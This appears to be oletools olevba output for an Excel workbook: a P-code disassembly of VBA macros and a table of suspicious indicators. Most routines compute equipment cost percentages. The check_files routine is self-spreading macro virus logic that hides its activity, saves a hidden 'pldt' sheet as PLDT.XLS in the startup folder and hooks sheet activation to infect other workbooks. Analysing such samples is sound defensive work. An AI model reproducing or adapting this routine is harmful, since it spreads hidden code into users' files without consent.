' 	MemSt Then 
' Line #110:
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #111:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #112:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Then 
' Line #113:
' 	QuoteRem 0x0004 0x0016 "Gets Fire Protection %"
' Line #114:
' 	LitStr 0x0008 "MiscCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Then 
' Line #115:
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #116:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #117:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Then 
' Line #118:
' 	QuoteRem 0x0004 0x0015 "Gets Transportation %"
' Line #119:
' 	LitStr 0x0009 "TransCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Then 
' Line #120:
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #121:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #122:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Then 
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' 	FuncDefn (Public Sub GetPercentDefault())
' Line #126:
' 	Dim 
' 	VarDefn I (As Double)
' Line #127:
' 	OnError ErrorHandler 
' Line #128:
' 	QuoteRem 0x0004 0x000B "Gets Rack %"
' Line #129:
' 	LitStr 0x0005 "Cont1"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Then 
' Line #130:
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #131:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #132:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Then 
' Line #133:
' 	QuoteRem 0x0004 0x000C "Gets AS/RS %"
' Line #134:
' 	LitStr 0x0005 "Cont2"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Then 
' Line #135:
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #136:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #137:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Then 
' Line #138:
' 	QuoteRem 0x0004 0x001E "Gets Load Handling Equipment %"
' Line #139:
' 	LitStr 0x0005 "Cont3"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Then 
' Line #140:
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #141:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #142:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Then 
' Line #143:
' 	QuoteRem 0x0004 0x0028 "Gets Secondary Load Handling Equipment %"
' Line #144:
' 	LitStr 0x0005 "Cont4"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Then 
' Line #145:
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #146:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #147:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Then 
' Line #148:
' 	QuoteRem 0x0004 0x000F "Gets Controls %"
' Line #149:
' 	LitStr 0x0005 "Cont5"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Then 
' Line #150:
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #151:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #152:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Then 
' Line #153:
' 	QuoteRem 0x0004 0x0010 "Gets Inventory %"
' Line #154:
' 	LitStr 0x0005 "Cont6"
' 	ArgsLd Range 0x0001 
' 	LitStr 0x0005 "Cont7"
' 	ArgsLd Range 0x0001 
' 	Add 
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Then 
' Line #155:
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #156:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #157:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Then 
' Line #158:
' 	QuoteRem 0x0004 0x002F "Gets Power Distibution & Communication System %"
' Line #159:
' 	LitStr 0x0005 "Cont8"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Then 
' Line #160:
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #161:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #162:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Then 
' Line #163:
' 	QuoteRem 0x0004 0x001A "Gets Misc Project Expense%"
' Line #164:
' 	LitStr 0x0006 "Cont10"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Then 
' Line #165:
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #166:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #167:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Then 
' Line #168:
' 	QuoteRem 0x0004 0x0016 "Gets Fire Protection %"
' Line #169:
' 	LitStr 0x0005 "Cont9"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Then 
' Line #170:
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #171:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #172:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Then 
' Line #173:
' 	QuoteRem 0x0004 0x0015 "Gets Transportation %"
' Line #174:
' 	LitStr 0x0006 "Cont11"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Then 
' Line #175:
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #176:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #177:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Then 
' Line #178:
' 	Label ErrorHandler 
' Line #179:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Then 
' Line #180:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Then 
' Line #181:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Then 
' Line #182:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Then 
' Line #183:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Then 
' Line #184:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Then 
' Line #185:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Then 
' Line #186:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Then 
' Line #187:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Then 
' Line #188:
' 	LitDI2 0x0000 
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Then 
' Line #189:
' 	ExitSub 
' Line #190:
' 	EndSub 
' Line #191:
' Line #192:
' 	FuncDefn (Sub check_files())
' Line #193:
' 	QuoteRem 0x0004 0x0016 "Find xlStart directory"
' Line #194:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St C$ 
' Line #195:
' 	QuoteRem 0x0004 0x001F "Check to see if pldt.xls exists"
' Line #196:
' 	Ld C$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0008 "PLDT.XLS"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St m$ 
' Line #197:
' 	Ld m$ 
' 	LitStr 0x0008 "PLDT.XLS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St p 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St p 
' 	EndIf 
' Line #198:
' 	QuoteRem 0x0004 0x0032 "Check if the active workbook has any modules in it"
' Line #199:
' 	Ld ActiveWorkbook 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St w 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St w 
' 	EndIf 
' Line #200:
' 	QuoteRem 0x0004 0x0034 "whichfile variable set to 10, 20 or 0 based on above"
' Line #201:
' 	Ld p 
' 	Ld w 
' 	LitDI2 0x000A 
' 	Mul 
' 	Add 
' 	St whichfile 
' Line #202:
' 	Ld whichfile 
' 	SelectCase 
' Line #203:
' 	QuoteRem 0x0004 0x0036 "pldt.xls file exists or active workbook has modules..."
' Line #204:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #205:
' 	QuoteRem 0x0004 0x0023 "can't see what the program is doing"
' Line #206:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #207:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St n4$ 
' Line #208:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "pldt"
' 	ArgsLd sheets 0x0001 
' 	MemSt Visible 
' Line #209:
' 	LitStr 0x0004 "pldt"
' 	ArgsLd sheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #210:
' 	LitStr 0x0004 "pldt"
' 	ArgsLd sheets 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #211:
' 	QuoteRem 0x0004 0x002E "Clears this information for the activeworkbook"
' Line #212:
' 	StartWithExpr 
' 	Ld ActiveWorkbook 
' 	With 
' Line #213:
' 	LitStr 0x0000 ""
' 	MemStWith Title 
' Line #214:
' 	LitStr 0x0000 ""
' 	MemStWith Subject 
' Line #215:
' 	LitStr 0x0000 ""
' 	MemStWith Author 
' Line #216:
' 	LitStr 0x0000 ""
' 	MemStWith Keywords 
' Line #217:
' 	LitStr 0x0000 ""
' 	MemStWith Comments 
' Line #218:
' 	EndWith 
' Line #219:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St newname$ 
' Line #220:
' 	ArgsLd CurDir 0x0000 
' 	St c4$ 
' Line #221:
' 	QuoteRem 0x0004 0x0028 "Changes the current directory to xlStart"
' Line #222:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsCall ChDir 0x0001 
' Line #223:
' 	QuoteRem 0x0004 0x001F "Can't see the current window..."
' Line #224:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #225:
' 	QuoteRem 0x0004 0x003C "Save the activeworkbook as pldt.xls in the xlStart directory"
' Line #226:
' 	LineCont 0x0008 13 00 08 00 1E 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	LitStr 0x0008 "PLDT.XLS"
' 	Concat 
' 	ParamNamed Filename 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WriteResPassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed CreateBackup 
' 	Ld newname$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0006 
' Line #227:
' 	QuoteRem 0x0004 0x002F "Puts the current directory back to where it was"
' Line #228:
' 	Ld c4$ 
' 	ArgsCall ChDir 0x0001 
' Line #229:
' 	QuoteRem 0x0004 0x0013 "hide the pldt sheet"
' Line #230:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "pldt"
' 	Ld n4$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd sheets 0x0001 
' 	MemSt Visible 
' Line #231:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #232:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #233:
' 	LitStr 0x0014 "PLDT.XLS!check_files"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #234:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #235:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #236:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St n4$ 
' Line #237:
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	St p4$ 
' Line #238:
' 	LitDI2 0x0001 
' 	Ld n4$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd sheets 0x0001 
' 	MemLd New 
' 	St s$ 
' Line #239:
' 	Ld s$ 
' 	LitStr 0x0004 "pldt"
' 	Ne 
' 	IfBlock 
' Line #240:
' 	LitDI2 0x0001 
' 	Ld n4$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd sheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0004 "pldt"
' 	LitStr 0x0008 "PLDT.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #241:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "pldt"
' 	Ld n4$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd sheets 0x0001 
' 	MemSt Visible 
' Line #242:
' 	ElseBlock 
' Line #243:
' 	EndIfBlock 
' Line #244:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #245:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #246:
' 	LitStr 0x0014 "PLDT.XLS!check_files"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #247:
' 	CaseElse 
' Line #248:
' 	EndSelect 
' Line #249:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

